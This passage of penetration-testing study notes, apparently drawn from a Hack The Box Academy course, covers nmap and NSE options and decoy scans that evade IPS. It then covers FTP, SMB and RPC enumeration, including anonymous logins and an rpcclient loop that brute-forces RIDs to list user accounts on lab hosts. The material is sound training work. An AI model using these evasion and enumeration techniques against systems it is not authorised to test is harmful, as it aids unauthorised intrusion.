      <td><code class="language-plaintext highlighter-rouge">-sV</code></td>
      <td>Performs service version detection on specified ports.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>Disable icmp requests</td>
    </tr>
    <tr>
      <td>-sC</td>
      <td>Scripting Engine NSE</td>
    </tr>
  </tbody>
</table>

<h2 id="nmap-scripting-engine">Nmap Scripting Engine</h2>

<hr />

<p>Nmap Scripting Engine (<code class="language-plaintext highlighter-rouge">NSE</code>) is another handy feature of <code class="language-plaintext highlighter-rouge">Nmap</code>. It provides us with the possibility to create scripts in Lua for interaction with certain services. There are a total of 14 categories into which these scripts can be divided:</p>

<table>
  <thead>
    <tr>
      <th><strong>Category</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">auth</code></td>
      <td>Determination of authentication credentials.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">broadcast</code></td>
      <td>Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">brute</code></td>
      <td>Executes scripts that try to log in to the respective service by brute-forcing with credentials.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">default</code></td>
      <td>Default scripts executed by using the <code class="language-plaintext highlighter-rouge">-sC</code> option.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">discovery</code></td>
      <td>Evaluation of accessible services.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dos</code></td>
      <td>These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">exploit</code></td>
      <td>This category of scripts tries to exploit known vulnerabilities for the scanned port.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">external</code></td>
      <td>Scripts that use external services for further processing.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">fuzzer</code></td>
      <td>This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">intrusive</code></td>
      <td>Intrusive scripts that could negatively affect the target system.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">malware</code></td>
      <td>Checks if some malware infects the target system.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">safe</code></td>
      <td>Defensive scripts that do not perform intrusive and destructive access.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">version</code></td>
      <td>Extension for service detection.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">vuln</code></td>
      <td>Identification of specific vulnerabilities.</td>
    </tr>
  </tbody>
</table>

<p>We have several ways to define the desired scripts in <code class="language-plaintext highlighter-rouge">Nmap</code>.</p>

<p>use always <strong><code class="language-plaintext highlighter-rouge">-sC</code></strong>  for scriptiin</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">10.129.2.28</code></td>
      <td>Scans the specified target.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-p 21,22,25</code></td>
      <td>Scans only the specified ports.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-sS</code></td>
      <td>Performs SYN scan on specified ports.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-sA</code></td>
      <td>Performs ACK scan on specified ports.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
      <td>Disables ICMP Echo requests.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
      <td>Disables DNS resolution.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">--disable-arp-ping</code></td>
      <td>Disables ARP ping.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">--packet-trace</code></td>
      <td>Shows all packets sent and received.</td>
    </tr>
    <tr>
      <td>-D:</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h3 id="decoys">Decoys</h3>

<p>There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (<code class="language-plaintext highlighter-rouge">-D</code>) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (<code class="language-plaintext highlighter-rouge">RND</code>) a specific number (for example: <code class="language-plaintext highlighter-rouge">5</code>) of IP addresses separated by a colon (<code class="language-plaintext highlighter-rouge">:</code>). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap 10.129.2.80 <span class="nt">-p</span> 10001 <span class="nt">-O</span> <span class="nt">-D</span> RND:5 <span class="nt">--disable-arp-ping</span> <span class="nt">-Pn</span> <span class="nt">-e</span> tun0
</code></pre></div></div>

<p>Enumeration Methodology</p>

<hr />

<p>Complex processes must have a standardized methodology that helps us keep our bearings and avoid omitting any aspects by mistake. Especially with the variety of cases that the target systems can offer us, it is almost unpredictable how our approach should be designed. Therefore, most penetration testers follow their habits and the steps they feel most comfortable and familiar with. However, this is not a standardized methodology but rather an experience-based approach.</p>

<p>We know that penetration testing, and therefore enumeration, is a dynamic process. Consequently, we have developed a static enumeration methodology for external and internal penetration tests that includes free dynamics and allows for a wide range of changes and adaptations to the given environment. This methodology is nested in 6 layers and represents, metaphorically speaking, boundaries that we try to pass with the enumeration process. The whole enumeration process is divided into three different levels:</p>

<p>|<code class="language-plaintext highlighter-rouge">Infrastructure-based enumeration</code>|<code class="language-plaintext highlighter-rouge">Host-based enumeration</code>|<code class="language-plaintext highlighter-rouge">OS-based enumeration</code>|
|—|—|—|</p>

<p><img src="https://academy.hackthebox.com/storage/modules/112/enum-method3.png" alt="image" /></p>

<p>These layers are designed as follows:</p>

<table>
  <thead>
    <tr>
      <th><strong>Layer</strong></th>
      <th><strong>Description</strong></th>
      <th><strong>Information Categories</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">1. Internet Presence</code></td>
      <td>Identification of internet presence and externally accessible infrastructure.</td>
      <td>Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">2. Gateway</code></td>
      <td>Identify the possible security measures to protect the company’s external and internal infrastructure.</td>
      <td>Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">3. Accessible Services</code></td>
      <td>Identify accessible interfaces and services that are hosted externally or internally.</td>
      <td>Service Type, Functionality, Configuration, Port, Version, Interface</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">4. Processes</code></td>
      <td>Identify the internal processes, sources, and destinations associated with the services.</td>
      <td>PID, Processed Data, Tasks, Source, Destination</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">5. Privileges</code></td>
      <td>Identification of the internal permissions and privileges to the accessible services.</td>
      <td>Groups, Users, Permissions, Restrictions, Environment</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">6. OS Setup</code></td>
      <td>Identification of the internal components and systems setup.</td>
      <td>OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files</td>
    </tr>
  </tbody>
</table>

<p>Important note: The human aspect and the information that can be obtained by employees using OSINT have been removed from the “Internet Presence” layer for simplicity.</p>

<p>We can finally imagine the entire penetration test in the form of a labyrinth where we have to identify the gaps and find the way to get us inside as quickly and effectively as possible. This type of labyrinth may look something like this:</p>

<p><img src="https://academy.hackthebox.com/storage/modules/112/pentest-labyrinth.png" alt="image" /></p>

<p>The squares represent the gaps/vulnerabilities.</p>

<p>As we have probably already noticed, we can see that we will encounter one gap and very likely several. The interesting and very common fact is that not all the gaps we find can lead us inside. All penetration tests are limited in time, but we should always keep in mind that one belief that there is nearly always a way in. Even after a four-week penetration test, we cannot say 100% that there are no more vulnerabilities. Someone who has been studying the company for months and analyzing them will most likely have a much greater understanding of the applications and structure than we were able to gain within the few weeks we spent on the assessment. An excellent and recent example of this is the <a href="https://www.rpc.senate.gov/policy-papers/the-solarwinds-cyberattack">cyber attack on SolarWinds</a>, which happened not too long ago. This is another excellent reason for a methodology that must exclude such cases.</p>

<hr />

<h1 id="ftp">FTP</h1>

<p>#ftp</p>

<p>The <code class="language-plaintext highlighter-rouge">File Transfer Protocol</code> (<code class="language-plaintext highlighter-rouge">FTP</code>) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as <code class="language-plaintext highlighter-rouge">HTTP</code> or <code class="language-plaintext highlighter-rouge">POP</code>. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol.</p>

<p>Let us imagine that we want to upload local files to a server and download other files using the <a href="https://datatracker.ietf.org/doc/html/rfc959">FTP</a> protocol. In an FTP connection, two channels are opened. First, the client and server establish a control channel through <code class="language-plaintext highlighter-rouge">TCP port 21</code>. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via <code class="language-plaintext highlighter-rouge">TCP port 20</code>. This channel is used exclusively for data transmission, and the protocol watches for errors during this process. If a connection is broken off during transmission, the transport can be resumed after re-established contact.</p>

<p>A distinction is made between <code class="language-plaintext highlighter-rouge">active</code> and <code class="language-plaintext highlighter-rouge">passive</code> FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the <code class="language-plaintext highlighter-rouge">passive mode</code> has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.</p>

<h3 id="tftp">TFTP</h3>

<p><code class="language-plaintext highlighter-rouge">Trivial File Transfer Protocol</code> (<code class="language-plaintext highlighter-rouge">TFTP</code>) is simpler than FTP and performs file transfers between client and server processes. However, it <code class="language-plaintext highlighter-rouge">does not</code> provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses <code class="language-plaintext highlighter-rouge">UDP</code>, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.</p>

<p>Let us take a look at a few commands of <code class="language-plaintext highlighter-rouge">TFTP</code>:</p>

<table>
  <thead>
    <tr>
      <th><strong>Commands</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">connect</code></td>
      <td>Sets the remote host, and optionally the port, for file transfers.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">get</code></td>
      <td>Transfers a file or set of files from the remote host to the local host.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">put</code></td>
      <td>Transfers a file or set of files from the local host onto the remote host.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">quit</code></td>
      <td>Exits tftp.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">status</code></td>
      <td>Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">verbose</code></td>
      <td>Turns verbose mode, which displays additional information during file transfer, on or off.</td>
    </tr>
  </tbody>
</table>

<p>Unlike the FTP client, <code class="language-plaintext highlighter-rouge">TFTP</code> does not have directory listing functionality.</p>

<h4 id="vsftpd-config-file">vsFTPd Config File</h4>

<p>Configuration file is on</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nv">$ </span><span class="nb">cat</span> /etc/vsftpd.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"#"</span>
</code></pre></div></div>

<table>
  <thead>
    <tr>
      <th><strong>Setting</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">listen=NO</code></td>
      <td>Run from inetd or as a standalone daemon?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">listen_ipv6=YES</code></td>
      <td>Listen on IPv6 ?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">anonymous_enable=NO</code></td>
      <td>Enable Anonymous access?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">local_enable=YES</code></td>
      <td>Allow local users to login?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dirmessage_enable=YES</code></td>
      <td>Display active directory messages when users go into certain directories?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">use_localtime=YES</code></td>
      <td>Use local time?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">xferlog_enable=YES</code></td>
      <td>Activate logging of uploads/downloads?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">connect_from_port_20=YES</code></td>
      <td>Connect from port 20?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">secure_chroot_dir=/var/run/vsftpd/empty</code></td>
      <td>Name of an empty directory</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">pam_service_name=vsftpd</code></td>
      <td>This string is the name of the PAM service vsftpd will use.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</code></td>
      <td>The last three options specify the location of the RSA certificate to use for SSL encrypted connections.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</code></td>
      <td> </td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">ssl_enable=NO</code></td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>UNSAFE OPTIONS ARE:</p>

<table>
  <thead>
    <tr>
      <th><strong>Setting</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">anonymous_enable=YES</code></td>
      <td>Allowing anonymous login?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">anon_upload_enable=YES</code></td>
      <td>Allowing anonymous to upload files?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">anon_mkdir_write_enable=YES</code></td>
      <td>Allowing anonymous to create new directories?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">no_anon_password=YES</code></td>
      <td>Do not ask anonymous for password?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">anon_root=/home/username/ftp</code></td>
      <td>Directory for anonymous.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">write_enable=YES</code></td>
      <td>Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?</td>
    </tr>
  </tbody>
</table>

<p>As soon as we connect to the vsFTPd server, the <code class="language-plaintext highlighter-rouge">response code 220</code> is displayed with the banner of the FTP server. Often this banner contains the description of the <code class="language-plaintext highlighter-rouge">service</code> and even the <code class="language-plaintext highlighter-rouge">version</code> of it. It also tells us what type of system the FTP server is. One of the most common configurations of FTP servers is to allow <code class="language-plaintext highlighter-rouge">anonymous</code> access, which does not require legitimate credentials but provides access to some files. Even if we cannot download them, sometimes just listing the contents is enough to generate further ideas and note down information that will help us in another approach.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>ftp 10.129.14.136

Connected to 10.129.14.136.
220 <span class="s2">"Welcome to the vsFTP service."</span>
Name <span class="o">(</span>10.129.14.136:cry0l1t3<span class="o">)</span>: anonymous

230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.


ftp&gt; <span class="nb">ls

</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
150 Here comes the directory listing.
<span class="nt">-rw-rw-r--</span>    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
<span class="nt">-rw-rw-r--</span>    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK
</code></pre></div></div>

<p>to find every script NSE
#nse #nmap</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-name</span> ftp<span class="k">*</span> 2&gt;/dev/null | <span class="nb">grep </span>scripts

/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
</code></pre></div></div>

<h1 id="smb">SMB</h1>

<hr />
<p><strong><code class="language-plaintext highlighter-rouge">Server Message Block</code> (<code class="language-plaintext highlighter-rouge">SMB</code>) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. Information exchange between different system processes can also be handled based on the SMB protocol. <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688">SMB</a></strong> first became available to a broader public, for example, as part of the OS/2 network operating system LAN Manager and LAN Server. Since then, the main application area of the protocol has been the Windows operating system series in particular, whose network services support SMB in a downward-compatible manner - which means that devices with newer editions can easily communicate with devices that have an older Microsoft operating system installed. With the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.</p>

<p>An SMB server can provide arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. Access rights are defined by <code class="language-plaintext highlighter-rouge">Access Control Lists</code> (<code class="language-plaintext highlighter-rouge">ACL</code>). They can be controlled in a fine-grained manner based on attributes such as <code class="language-plaintext highlighter-rouge">execute</code>, <code class="language-plaintext highlighter-rouge">read</code>, and <code class="language-plaintext highlighter-rouge">full access</code> for individual users or user groups. The <strong>ACL</strong> are defined based on the shares and therefore do not correspond to the rights assigned locally on the server.</p>

<h2 id="samba">Samba</h2>
<p>![[smb_protocols.png]]
As mentioned earlier, there is an alternative implementation of the SMB server called Samba, which is developed for Unix-based operating systems. Samba implements the Common Internet File System (<code class="language-plaintext highlighter-rouge">CIFS</code>) network protocol. <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/934c2faa-54af-4526-ac74-6a24d126724e">CIFS</a> is a dialect of SMB, meaning it is a specific implementation of the SMB protocol originally created by Microsoft. This allows Samba to communicate effectively with newer Windows systems. Therefore, it is often referred to as SMB/CIFS.</p>

<p>However, <code class="language-plaintext highlighter-rouge">CIFS</code> is considered a specific version of the SMB protocol, primarily aligning with <code class="language-plaintext highlighter-rouge">SMB version 1</code>. When SMB commands are transmitted over Samba to an older NetBIOS service, connections typically occur over TCP ports <code class="language-plaintext highlighter-rouge">137</code>, <code class="language-plaintext highlighter-rouge">138</code>, and <code class="language-plaintext highlighter-rouge">139</code>. In contrast, CIFS operates over TCP port <code class="language-plaintext highlighter-rouge">445</code> exclusively. There are several versions of SMB, including newer versions like <code class="language-plaintext highlighter-rouge">SMB 2</code> and <code class="language-plaintext highlighter-rouge">SMB 3</code>, which offer improvements and are preferred in modern infrastructures, while older versions like <code class="language-plaintext highlighter-rouge">SMB 1</code> (<code class="language-plaintext highlighter-rouge">CIFS</code>) are considered outdated but may still be used in specific environments.</p>

<p>We see global settings and two shares that are intended for printers. The global settings are the configuration of the available SMB server that is used for all shares. In the individual shares, however, the global settings can be overwritten, which can be configured with high probability even incorrectly. Let us look at some of the settings to understand how the shares are configured in Samba.</p>

<table>
  <thead>
    <tr>
      <th><strong>Setting</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">[sharename]</code></td>
      <td>The name of the network share.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">workgroup = WORKGROUP/DOMAIN</code></td>
      <td>Workgroup that will appear when clients query.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">path = /path/here/</code></td>
      <td>The directory to which user is to be given access.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">server string = STRING</code></td>
      <td>The string that will show up when a connection is initiated.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">unix password sync = yes</code></td>
      <td>Synchronize the UNIX password with the SMB password?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">usershare allow guests = yes</code></td>
      <td>Allow non-authenticated users to access defined share?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">map to guest = bad user</code></td>
      <td>What to do when a user login request doesn’t match a valid UNIX user?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">browseable = yes</code></td>
      <td>Should this share be shown in the list of available shares?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">guest ok = yes</code></td>
      <td>Allow connecting to the service without using a password?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">read only = yes</code></td>
      <td>Allow users to read files only?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">create mask = 0700</code></td>
      <td>What permissions need to be set for newly created files?</td>
    </tr>
  </tbody>
</table>

<hr />

<h2 id="dangerous-settings">Dangerous Settings</h2>

<p>Some of the above settings already bring some sensitive options. However, suppose we question the settings listed below and ask ourselves what the employees could gain from them, as well as attackers. In that case, we will see what advantages and disadvantages the settings bring with them. Let us take the setting <code class="language-plaintext highlighter-rouge">browseable = yes</code> as an example. If we as administrators adopt this setting, the company’s employees will have the comfort of being able to look at the individual folders with the contents. Many folders are eventually used for better organization and structure. If the employee can browse through the shares, the attacker will also be able to do so after successful access.</p>

<table>
  <thead>
    <tr>
      <th><strong>Setting</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">browseable = yes</code></td>
      <td>Allow listing available shares in the current share?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">read only = no</code></td>
      <td>Forbid the creation and modification of files?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">writable = yes</code></td>
      <td>Allow users to create and modify files?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">guest ok = yes</code></td>
      <td>Allow connecting to the service without using a password?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">enable privileges = yes</code></td>
      <td>Honor privileges assigned to specific SID?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">create mask = 0777</code></td>
      <td>What permissions must be assigned to the newly created files?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">directory mask = 0777</code></td>
      <td>What permissions must be assigned to the newly created directories?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">logon script = script.sh</code></td>
      <td>What script needs to be executed on the user’s login?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">magic script = script.sh</code></td>
      <td>Which script should be executed when the script gets closed?</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">magic output = script.out</code></td>
      <td>Where the output of the magic script needs to be stored?</td>
    </tr>
  </tbody>
</table>

<p>Let us create a share called <code class="language-plaintext highlighter-rouge">[notes]</code> and a few others and see how the settings affect our enumeration process. We will use all of the above settings and apply them to this share. For example, this setting is often applied, if only for testing purposes. If it is then an internal subnet of a small team in a large department, this setting is often retained or forgotten to be reset. This leads to the fact that we can browse through all the shares and, with high probability, even download and inspect them.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
c0derpwner@htb[/htb]<span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="nt">-L</span> //10.129.14.128

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        print<span class="nv">$ </span>         Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>DEVSM<span class="o">)</span>

</code></pre></div></div>
<p>and to connect with notes</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span> smbclient //10.129.14.128/notes
</code></pre></div></div>

<h1 id="rpc">RPC</h1>

<p>The <a href="https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/">Remote Procedure Call</a> (<code class="language-plaintext highlighter-rouge">RPC</code>) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.129.14.128

Enter WORKGROUP<span class="se">\'</span>s password:
rpcclient <span class="nv">$&gt;</span> 
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">rpcclient</code> offers us many different requests with which we can execute specific functions on the SMB server to get information. A complete list of all these functions can be found on the <a href="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html">man page</a> of the rpcclient.</p>

<table>
  <thead>
    <tr>
      <th><strong>Query</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">srvinfo</code></td>
      <td>Server information.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">enumdomains</code></td>
      <td>Enumerate all domains that are deployed in the network.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">querydominfo</code></td>
      <td>Provides domain, server, and user information of deployed domains.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">netshareenumall</code></td>
      <td>Enumerates all available shares.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">netsharegetinfo &lt;share&gt;</code></td>
      <td>Provides information about a specific share.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">enumdomusers</code></td>
      <td>Enumerates all domain users.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">queryuser &lt;RID&gt;</code></td>
      <td>Provides information about a specific user.</td>
    </tr>
  </tbody>
</table>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
c0derpwner@htb[/htb]<span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>500 1100<span class="si">)</span><span class="p">;</span><span class="k">do </span>rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.129.14.128 <span class="nt">-c</span> <span class="s2">"queryuser 0x</span><span class="si">$(</span><span class="nb">printf</span> <span class="s1">'%x\n'</span> <span class="nv">$i</span><span class="si">)</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="s2">"User Name</span><span class="se">\|</span><span class="s2">user_rid</span><span class="se">\|</span><span class="s2">group_rid"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">""</span><span class="p">;</span><span class="k">done

        </span>User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
    
        User Name   :   c0der
        user_rid :      0x3e8
        group_rid:      0x201
    
        User Name   :   other_User
        user_rid :      0x3e9
        group_rid:      0x201
</code></pre></div></div>
<p>An alternative to this would be a Python script from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> called <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py">samrdump.py</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samrdump.py 10.129.14.128
</code></pre></div></div>

<p>The information we have already obtained with <code class="language-plaintext highlighter-rouge">rpcclient</code> can also be obtained using other tools. For example, the <a href="https://github.com/ShawnDEvans/smbmap">SMBMap</a> and <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> tools are also widely used and helpful for the enumeration of SMB services.</p>

<hr />

<h1 id="ftp-1">FTP</h1>
<p>#ftp</p>

<p>The <code class="language-plaintext highlighter-rouge">File Transfer Protocol</code> (<code class="language-plaintext highlighter-rouge">FTP</code>) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as <code class="language-plaintext highlighter-rouge">HTTP</code> or <code class="language-plaintext highlighter-rouge">POP</code>. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol. 
NB: First, the client and server establish a control channel through <code class="language-plaintext highlighter-rouge">TCP port 21</code>. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via <code class="language-plaintext highlighter-rouge">TCP port 20</code>. This channel is used exclusively for data transmission.
